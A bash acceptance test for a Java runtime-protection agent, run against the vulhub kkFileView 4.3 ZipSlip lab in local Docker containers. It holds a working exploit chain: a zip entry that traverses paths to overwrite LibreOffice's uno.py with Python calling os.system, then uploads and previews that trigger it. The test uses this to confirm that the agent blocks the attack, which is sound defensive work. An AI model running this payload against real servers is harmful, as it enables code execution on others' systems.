#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_KKFILEVIEW_IMAGE:-vulhub/kkfileview:4.3.0}"
vulhub_dir="${OHMYRASP_VULHUB_KKFILEVIEW_DIR:-/home/ubuntu/vulhub/kkfileview/4.3-zipslip-rce}"
sample_odt="${OHMYRASP_VULHUB_KKFILEVIEW_SAMPLE_ODT:-${vulhub_dir}/sample.odt}"
baseline_name="${OHMYRASP_VULHUB_KKFILEVIEW_BASELINE_NAME:-ohmyrasp-vulhub-kkfileview-baseline}"
protected_name="${OHMYRASP_VULHUB_KKFILEVIEW_PROTECTED_NAME:-ohmyrasp-vulhub-kkfileview-protected}"
marker="${OHMYRASP_VULHUB_KKFILEVIEW_MARKER:-/tmp/ohmyrasp-kkfileview-success}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-kkfileview-43-zipslip-java8-baseline"
protected_dir="logs/vulhub-kkfileview-43-zipslip-java8-protected"
protected_log="${protected_dir}/events.jsonl"
uno_path="/opt/libreoffice7.5/program/uno.py"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

if [[ ! -f "$sample_odt" ]]; then
  echo "missing kkFileView sample ODT: ${sample_odt}" >&2
  exit 1
fi

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "${baseline_dir}/payload" "${protected_dir}/payload"

copy_log() {
  local name="$1"
  local dir="$2"
  docker logs "$name" > "${dir}/container.log" 2>&1 || true
}

cleanup_container() {
  local name="$1"
  docker rm -f "$name" >/dev/null 2>&1 || true
}

cleanup() {
  copy_log "$baseline_name" "$baseline_dir"
  copy_log "$protected_name" "$protected_dir"
  cleanup_container "$baseline_name"
  cleanup_container "$protected_name"
}
trap cleanup EXIT

create_payloads() {
  local dir="$1"
  python3 - "$dir" "$marker" <<'PY'
import sys
import zipfile
from pathlib import Path

work = Path(sys.argv[1])
marker = sys.argv[2]
payload = "import os\nos.system('touch %s')\n" % marker
with zipfile.ZipFile(work / "test.zip", "w") as zf:
    zf.writestr("test", "test")
    zf.writestr("../../../../../../../../../../opt/libreoffice7.5/program/uno.py", payload)
PY
  cp "$sample_odt" "${dir}/sample.odt"
}

start_container() {
  local name="$1"
  local protected="$2"
  local dir="$3"
  cleanup_container "$name"
  if [[ "$protected" == "true" ]]; then
    rm -f "$protected_log"
    docker run -d --name "$name" \
      -p 127.0.0.1::8012 \
      -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
      -v "$(pwd)/${dir}:/opt/ohmyrasp/logs" \
      -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
      "$image" >/dev/null
  else
    docker run -d --name "$name" \
      -p 127.0.0.1::8012 \
      "$image" >/dev/null
  fi
  docker port "$name" 8012/tcp | sed 's/.*://'
}

wait_for_http() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 120); do
    status="$(
      curl --max-time 3 -sS -o "${dir}/ready-${attempt}.html" -w "%{http_code}" \
        "http://127.0.0.1:${port}/" 2>/dev/null || true
    )"
    if [[ -z "$status" ]]; then
      status="000"
    fi
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    if ! docker inspect -f '{{.State.Running}}' "$name" 2>/dev/null | grep -q true; then
      copy_log "$name" "$dir"
      echo "kkFileView container ${name} exited before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  copy_log "$name" "$dir"
  echo "kkFileView container ${name} did not become ready" >&2
  exit 1
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log" 2>/dev/null; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 2>/dev/null || true
  echo "missing Java8 agent startup event for kkFileView protected container" >&2
  exit 1
}

upload_file() {
  local port="$1"
  local file="$2"
  local output="$3"
  curl -fsS -F "file=@${file}" "http://127.0.0.1:${port}/fileUpload" > "$output"
  if ! grep -Fq '"success":true' "$output"; then
    cat "$output" >&2 || true
    echo "kkFileView upload failed for ${file}" >&2
    exit 1
  fi
}

preview_file() {
  local port="$1"
  local internal_url="$2"
  local output="$3"
  local status_output="$4"
  local encoded
  encoded="$(printf '%s' "$internal_url" | base64 | tr -d '\n')"
  curl -sS -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${port}/onlinePreview?url=${encoded}" > "$status_output" || true
}

assert_uno_overwritten() {
  local name="$1"
  local dir="$2"
  if ! docker exec "$name" grep -Fq "ohmyrasp-kkfileview-success" "$uno_path"; then
    copy_log "$name" "$dir"
    echo "kkFileView baseline did not overwrite ${uno_path}" >&2
    exit 1
  fi
  printf 'uno_overwritten=1\n' >> "${dir}/attempts.log"
}

assert_uno_not_overwritten() {
  local name="$1"
  local dir="$2"
  if docker exec "$name" grep -Fq "ohmyrasp-kkfileview-success" "$uno_path"; then
    copy_log "$name" "$dir"
    echo "kkFileView protected container still overwrote ${uno_path}" >&2
    exit 1
  fi
  printf 'uno_overwritten=0\n' >> "${dir}/attempts.log"
}

wait_for_marker() {
  local name="$1"
  local dir="$2"
  for attempt in $(seq 1 45); do
    printf 'marker_attempt=%s\n' "$attempt" >> "${dir}/attempts.log"
    if docker exec "$name" test -f "$marker"; then
      printf 'marker_created=1\n' >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done
  copy_log "$name" "$dir"
  echo "kkFileView baseline did not create ${marker}" >&2
  exit 1
}

assert_marker_absent() {
  local name="$1"
  local dir="$2"
  if docker exec "$name" test -f "$marker"; then
    copy_log "$name" "$dir"
    echo "kkFileView protected container created ${marker}" >&2
    exit 1
  fi
  printf 'marker_absent=1\n' >> "${dir}/attempts.log"
}

wait_for_archive_block() {
  for attempt in $(seq 1 45); do
    printf 'archive_block_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
    if grep -Eq '"algorithm":"java8_archive_entry_traversal_write".*"action":"block"' "$protected_log" 2>/dev/null; then
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 2>/dev/null || true
  echo "missing java8_archive_entry_traversal_write block event for kkFileView ZipSlip" >&2
  exit 1
}

run_baseline() {
  local port
  create_payloads "${baseline_dir}/payload"
  port="$(start_container "$baseline_name" false "$baseline_dir")"
  printf 'kkfileview_port=%s\n' "$port" >> "${baseline_dir}/attempts.log"
  wait_for_http "$baseline_name" "$port" "$baseline_dir"
  docker exec "$baseline_name" rm -f "$marker"
  upload_file "$port" "${baseline_dir}/payload/test.zip" "${baseline_dir}/upload-zip.json"
  upload_file "$port" "${baseline_dir}/payload/sample.odt" "${baseline_dir}/upload-odt.json"
  preview_file "$port" \
    "http://127.0.0.1:8012/demo/test.zip" \
    "${baseline_dir}/preview-zip.html" \
    "${baseline_dir}/preview-zip.status"
  printf 'preview_zip_status=%s\n' "$(cat "${baseline_dir}/preview-zip.status")" >> "${baseline_dir}/attempts.log"
  sleep 3
  assert_uno_overwritten "$baseline_name" "$baseline_dir"
  preview_file "$port" \
    "http://127.0.0.1:8012/demo/sample.odt" \
    "${baseline_dir}/preview-odt.html" \
    "${baseline_dir}/preview-odt.status"
  printf 'preview_odt_status=%s\n' "$(cat "${baseline_dir}/preview-odt.status")" >> "${baseline_dir}/attempts.log"
  wait_for_marker "$baseline_name" "$baseline_dir"
  copy_log "$baseline_name" "$baseline_dir"
  cleanup_container "$baseline_name"
}

run_protected() {
  local port
  create_payloads "${protected_dir}/payload"
  port="$(start_container "$protected_name" true "$protected_dir")"
  printf 'kkfileview_port=%s\n' "$port" >> "${protected_dir}/attempts.log"
  wait_for_protected_startup
  wait_for_http "$protected_name" "$port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "kkFileView protected startup produced a detection before exploit traffic" >&2
    exit 1
  fi
  docker exec "$protected_name" rm -f "$marker"
  upload_file "$port" "${protected_dir}/payload/test.zip" "${protected_dir}/upload-zip.json"
  upload_file "$port" "${protected_dir}/payload/sample.odt" "${protected_dir}/upload-odt.json"
  preview_file "$port" \
    "http://127.0.0.1:8012/demo/test.zip" \
    "${protected_dir}/preview-zip.html" \
    "${protected_dir}/preview-zip.status"
  printf 'preview_zip_status=%s\n' "$(cat "${protected_dir}/preview-zip.status")" >> "${protected_dir}/attempts.log"
  wait_for_archive_block
  assert_uno_not_overwritten "$protected_name" "$protected_dir"
  assert_marker_absent "$protected_name" "$protected_dir"
  preview_file "$port" \
    "http://127.0.0.1:8012/demo/sample.odt" \
    "${protected_dir}/preview-odt.html" \
    "${protected_dir}/preview-odt.status"
  printf 'preview_odt_status=%s\n' "$(cat "${protected_dir}/preview-odt.status")" >> "${protected_dir}/attempts.log"
  sleep 5
  assert_marker_absent "$protected_name" "$protected_dir"
  copy_log "$protected_name" "$protected_dir"
  cleanup_container "$protected_name"
}

run_baseline
run_protected

echo "vulhub kkFileView 4.3 ZipSlip Java8 acceptance passed"
